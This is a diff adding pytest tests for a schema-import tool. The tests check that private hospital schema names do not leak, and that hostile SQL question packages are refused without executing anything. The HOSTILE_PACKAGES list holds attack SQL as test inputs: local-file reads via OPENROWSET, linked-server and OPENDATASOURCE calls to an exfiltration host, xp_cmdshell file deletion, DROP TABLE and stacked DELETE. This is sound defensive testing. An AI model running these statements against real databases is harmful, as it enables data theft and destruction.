@@ -497,3 +497,246 @@ def test_the_module_and_an_import_open_no_network_module(exported, project, tmp_
                           env={**os.environ, "PYTHONPATH": str(ROOT / "core")}, timeout=300)
     assert done.returncode == 0, done.stderr
     assert done.stdout.strip().splitlines()[-1] == "[]"
+
+
+# A private hospital schema with planted names, exported beside and imported into (B3). The schema is made from the
+# invented dictionary with three of its names replaced by planted ones, so that its bindings, its named normalisation,
+# its journal and its concept translations all carry a name that no public file holds. Nothing of it may reach the
+# exported workspace or any status that returns to the agent.
+
+PLANTED_RENAMED = {"OBS_SHEET": "PLANTED_PRIVATE_SHEET", "READ_VALUE": "PLANTED_PRIVATE_VALUE", "VISIT": "PLANTED_PRIVATE_VISIT"}
+PLANTED_PRIVATE = tuple(PLANTED_RENAMED.values()) + ("PLANTED_PRIVATE_CODE", "PLANTED_PRIVATE_DESCRIPTION",
+                                                     "PLANTED_PRIVATE_NOTE", "PLANTED_PRIVATE_HOSPITAL")
+
+
+def _planted_text(path):
+    text = path.read_text(encoding="utf-8")
+    for name, planted in PLANTED_RENAMED.items():
+        text = re.sub(rf"\b{name}\b", planted, text)
+    return text
+
+
+def _planted_tables_result():
+    lines = _planted_text(ROOT / "fixtures" / "invented-catalogue.csv").strip().splitlines()
+    head = ["TABLE_SCHEMA", "TABLE_NAME", "COLUMN_NAME", "ORDINAL_POSITION", "DATA_TYPE", "CHARACTER_MAXIMUM_LENGTH",
+            "NUMERIC_PRECISION", "NUMERIC_SCALE", "IS_NULLABLE"]
+    rows = [dict(zip(lines[0].split(","), line.split(","))) for line in lines[1:]]
+    out = ["\t".join(head + ["TABLE_ROWS"])] + ["\t".join([r[k] or "NULL" for k in head] + ["1000"]) for r in rows]
+    return "\n".join(out) + "\n"
+
+
+def planted_private_schema():
+    """The bytes of a saved hospital schema whose bindings, normalisation, journal and concept translations carry the
+    planted names, made as the page makes one."""
+    fixtures = ROOT / "fixtures" / "dictionary"
+    s = describe.Describe()
+    s.version = "test"
+    s.settings["hospital"] = "PLANTED_PRIVATE_HOSPITAL"
+    s.load_dictionary(_planted_text(fixtures / "invented-dictionary.csv").encode("utf-8"),
+                      _planted_text(fixtures / "invented-tables.csv").encode("utf-8"), {},
+                      "planted-dictionary.csv", "planted-tables.csv")
+    s.propose(date=DATE)
+    s.set_settings("production", 2024, "Australia/Sydney", True)
+    s.tables_query()
+    s.read_tables(_planted_tables_result())
+    for about in workspace.CONFIRMED:
+        s.confirm(about, "yes", note="PLANTED_PRIVATE_NOTE" if about == "role_reading.value" else "", date=DATE)
+    s.choose_codes("role_reading.kind", dict(workspace.CODES), DATE)
+    s.correction_keep({"form": "path", "about": "role_anaesthetic.patient_key", "column": "PERSON_KEY",
+                       "steps": [{"from": "CASE_KEY", "table": "THEATRE_CASE", "to": "CASE_KEY"},
+                                 {"from": "VISIT_KEY", "table": "PLANTED_PRIVATE_VISIT", "to": "VISIT_KEY"}]}, date=DATE)
+    s.translate_concepts("map_drug_concept", [{"code": "PLANTED_PRIVATE_CODE", "description": "PLANTED_PRIVATE_DESCRIPTION",
+                                               "concept_id": 1, "status": "mapped", "provenance": "a person"}], DATE)
+    return s.save_zip(DATE)
+
+
+def _planted_in(data):
+    return [name for name in PLANTED_PRIVATE if name.encode("utf-8") in data]
+
+
+@pytest.fixture(scope="module")
+def planted_schema():
+    data = planted_private_schema()
+    import io
+    import zipfile
+    with zipfile.ZipFile(io.BytesIO(data)) as archive:
+        files = {name: archive.read(name) for name in archive.namelist()}
+    # Each planted name is held where the test means it to be, so that its absence below means something.
+    mapped = json.loads(files["map/map.json"])
+    assert mapped["roles"]["role_reading"]["columns"]["anaesthetic_key"]["binding"]["table"] == "PLANTED_PRIVATE_SHEET"
+    assert mapped["roles"]["role_reading"]["columns"]["value"]["binding"]["column"] == "PLANTED_PRIVATE_VALUE"
+    assert any(i["table"] == "PLANTED_PRIVATE_VISIT" for n in mapped["normalisations"].values() for i in n["inputs"])
+    assert mapped["concepts"]["views"]["map_drug_concept"]["rows"][0]["description"] == "PLANTED_PRIVATE_DESCRIPTION"
+    journal = files["journal.json"]
+    assert all(name.encode() in journal for name in ("PLANTED_PRIVATE_NOTE", "PLANTED_PRIVATE_HOSPITAL", "PLANTED_PRIVATE_CODE"))
+    return data
+
+
+def _fixed_status(result, name):
+    """Asserts that a status is the fixed one of the contract and nothing else: the folder's own name, a word of RESULTS,
+    the names of rules, and the fixed sentence for the status."""
+    rules = set(workspace.FOLDER_RULES) | {r["id"] for r in rolepolicy.check("SELECT 1")["rules"]}
+    assert sorted(result) == sorted(workspace.RESULT_FIELDS)
+    assert result["query"] == name and result["result"] in workspace.RESULTS
+    assert set(result["rules_failed"]) <= rules and bool(result["rules_failed"]) == (result["result"] == "malformed")
+    assert result["says"] == workspace.WORDING[result["result"]]
+
+
+def _leaks(text, *paths):
+    """What a returned text holds that it must not: a planted name, a path, or a diagnostic."""
+    found = [name for name in PLANTED_PRIVATE if name.lower() in text.lower()]
+    found += [str(p) for p in paths if str(p) in text]
+    found += [word for word in ("Traceback", "Error", "Exception", "line ", "sqlglot", ".py", "/", "\\") if word in text]
+    return found
+
+
+@pytest.mark.parametrize("sql, status", [
+    (None, "accepted"),
+    (ROW_LEVEL, "requires_private_review"),
+    ("SELECT COUNT(*) AS n FROM PLANTED_PRIVATE_SHEET s WHERE s.PLANTED_PRIVATE_VALUE > 0\n", "malformed"),
+])
+def test_a_private_schema_with_planted_names_reaches_neither_the_export_nor_any_status(
+        exported, planted, planted_schema, tmp_path, sql, status):
+    # The planted project sits beside the repository's public sources, and its saved schema in reference/ as well.
+    project = planted / "hospital-project"
+    (project / "schemas").mkdir(parents=True)
+    (project / "schemas" / "hospital-schema.schemalyser.zip").write_bytes(planted_schema)
+    (planted / "reference" / "hospital-schema.schemalyser.zip").write_bytes(planted_schema)
+    out = tmp_path / "out"
+    workspace.export(out, "public", repo=planted, date=DATE)
+    leaked = {p.relative_to(out).as_posix(): _planted_in(p.read_bytes()) for p in out.rglob("*") if p.is_file()}
+    assert {path: names for path, names in leaked.items() if names} == {}
+    # Each status, provoked in turn, names nothing of the hospital, no path and no diagnostic.
+    folder = _question_folder(exported, tmp_path, name="planted_question", sql=sql)
+    checked = workspace.check_folder(folder)
+    result, _, record = workspace.import_question(folder, project, date=DATE)
+    assert result["result"] == checked["status"] == status
+    _fixed_status(result, "planted_question")
+    text = (folder / workspace.RESULT).read_text(encoding="utf-8")
+    assert json.loads(text) == result
+    assert _leaks(text, project, tmp_path, planted) == [] and _leaks(json.dumps(result), project, tmp_path) == []
+    assert sorted(p.name for p in folder.iterdir()) == sorted(list(workspace.ACCEPTED_FILES) + [workspace.RESULT])
+    if status != "malformed":
+        # The private side does hold the planted names, which is where they belong.
+        validation = (record / "import-validation.json").read_bytes()
+        assert b"hospital-schema.schemalyser.zip" in validation
+
+
+# Hostile packages through the import, end to end (B4). Each is refused before anything reads it as a question, and the
+# test watches for any engine, process or file that the hostile content would have reached.
+
+@pytest.fixture()
+def sentinel(tmp_path):
+    """A file that a hostile package names and would change or read, with what it held and when it was last written."""
+    path = tmp_path / "sentinel" / "sentinel.txt"
+    path.parent.mkdir()
+    path.write_text("PLANTED_SENTINEL_CONTENT\n", encoding="utf-8")
+    return path, path.read_bytes(), path.stat().st_mtime_ns
+
+
+@pytest.fixture()
+def executions(monkeypatch):
+    """Every engine connection, process and shell command started while the import runs."""
+    import duckdb
+    started = []
+    real_connect = duckdb.connect
+    monkeypatch.setattr(duckdb, "connect", lambda *a, **k: started.append(("duckdb", a)) or real_connect(*a, **k))
+    real_popen = subprocess.Popen
+
+    class Watched(real_popen):
+        def __init__(self, *a, **k):
+            started.append(("process", a))
+            super().__init__(*a, **k)
+    monkeypatch.setattr(subprocess, "Popen", Watched)
+    monkeypatch.setattr(os, "system", lambda command: started.append(("shell", command)) or 1)
+    return started
+
+
+HOSTILE_PACKAGES = {
+    "a local file": [
+        "SELECT x.BulkColumn FROM OPENROWSET(BULK '{sentinel}', SINGLE_CLOB) AS x\n",
+        "BULK INSERT role_patient FROM '{sentinel}'\n",
+        "SELECT COUNT(*) AS n FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Text;Database={folder}', 'SELECT * FROM sentinel.txt') AS x\n",
+    ],
+    "an external resource": [
+        "SELECT p.patient_key FROM PLANTED_LINKED_SERVER.planted_db.dbo.role_patient p\n",
+        "SELECT q.n FROM OPENQUERY(PLANTED_LINKED_SERVER, 'SELECT 1 AS n') AS q\n",
+        "SELECT a.n FROM OPENDATASOURCE('MSOLEDBSQL', 'Data Source=https://planted-exfiltration.example.org/;').planted_db.dbo.t AS a\n",
+        "EXEC ('SELECT 1') AT PLANTED_LINKED_SERVER\n",
+    ],
+    "a statement other than a query": [
+        "EXEC xp_cmdshell 'rm {sentinel}'\n",
+        "INSERT INTO role_patient (patient_key) VALUES (1)\n",
+        "SELECT p.patient_key INTO PLANTED_COPY FROM role_patient p\n",
+        "EXECUTE dbo.planted_procedure\n",
+        "DROP TABLE role_patient\n",
+        "SELECT COUNT(*) AS n FROM role_patient p; DELETE FROM role_patient\n",
+    ],
+}
+
+
+@pytest.mark.parametrize("kind, sql", [(kind, sql) for kind, cases in HOSTILE_PACKAGES.items() for sql in cases])
+def test_a_hostile_question_is_refused_end_to_end_without_running_anything_or_returning_a_diagnostic(
+        exported, project, tmp_path, sentinel, executions, kind, sql):
+    path, held, written = sentinel
+    before = _project_files(project)
+    folder = _question_folder(exported, tmp_path, name="hostile", sql=sql.format(sentinel=path, folder=path.parent))
+    result, checked, record = workspace.import_question(folder, project, date=DATE)
+    assert result["result"] in ("malformed", "requires_private_review") and record is None
+    assert result["result"] == checked["status"] == "malformed"
+    _fixed_status(result, "hostile")
+    text = (folder / workspace.RESULT).read_text(encoding="utf-8")
+    assert _leaks(text, path, project, tmp_path) == [] and "PLANTED" not in text and "sentinel" not in text
+    # Nothing ran: no engine was opened, no process or shell started, the sentinel is as it was, and the project too.
+    assert executions == []
+    assert path.read_bytes() == held and path.stat().st_mtime_ns == written
+    assert _project_files(project) == before
+
+
+def _deep_folder(folder):
+    nested = folder
+    for depth in range(40):
+        nested = nested / f"d{depth}"
+    nested.mkdir(parents=True)
+    (nested / "question.sql").write_text("SELECT 1 AS one\n", encoding="utf-8")
+
+
+PROVOCATIONS = {
+    "a malformed JSON file": lambda folder, path: (folder / "package.json").write_text("{not json", encoding="utf-8"),
+    "a JSON file it never asked for": lambda folder, path: (folder / "question.json").write_text('{"sql": ', encoding="utf-8"),
+    "an oversize file": lambda folder, path: (folder / "question.sql").write_bytes(b"-- " + b"x" * (workspace.SIZE_LIMIT + 1) + b"\nSELECT 1 AS one\n"),
+    "a deep path": lambda folder, path: _deep_folder(folder),
+    "an invalid encoding": lambda folder, path: (folder / "question.sql").write_bytes("SELECT 1 AS one".encode("utf-16")),
+    "a byte that is no text": lambda folder, path: (folder / "note.md").write_bytes(b"\xff\xfe\xfa planted"),
+    "a NUL character": lambda folder, path: (folder / "title.txt").write_bytes(b"A title\x00 with a NUL\n"),
+    "a question nested past the parser's depth": lambda folder, path: (folder / "question.sql").write_text(
+        "SELECT " + "(" * 3000 + "1" + ")" * 3000 + " AS one FROM role_patient p\n", encoding="utf-8"),
+    "a result file that links to the sentinel": lambda folder, path: (folder / workspace.RESULT).symlink_to(path),
+}
+
+
+@pytest.mark.parametrize("provocation", list(PROVOCATIONS))
+def test_a_package_built_to_provoke_an_error_in_the_import_returns_only_a_fixed_status(
+        exported, project, tmp_path, sentinel, executions, provocation):
+    path, held, written = sentinel
+    before = _project_files(project)
+    folder = _question_folder(exported, tmp_path, name="provoking")
+    PROVOCATIONS[provocation](folder, path)
+    result, checked, record = workspace.import_question(folder, project, date=DATE)
+    assert result["result"] == checked["status"] == "malformed" and record is None
+    _fixed_status(result, "provoking")
+    text = (folder / workspace.RESULT).read_text(encoding="utf-8")
+    assert not (folder / workspace.RESULT).is_symlink()
+    assert _leaks(text, path, project, tmp_path) == []
+    assert executions == []
+    assert path.read_bytes() == held and path.stat().st_mtime_ns == written
+    assert _project_files(project) == before
+    # The command line, given the same package afresh, refuses it with the status and no trace of the error.
+    again = _question_folder(exported, tmp_path / "command", name="provoking")
+    PROVOCATIONS[provocation](again, path)
+    done = subprocess.run([sys.executable, "-m", "schemalyser.workspace", "import", str(again), "--hospital", str(project)],
+                          capture_output=True, text=True, cwd=ROOT / "core", timeout=300,
+                          env={**os.environ, "PYTHONPATH": str(ROOT / "core")})
+    assert done.returncode == 1 and "Traceback" not in done.stdout + done.stderr
+    assert json.loads((again / workspace.RESULT).read_text(encoding="utf-8"))["result"] == "malformed"
+    assert path.read_bytes() == held and _project_files(project) == before
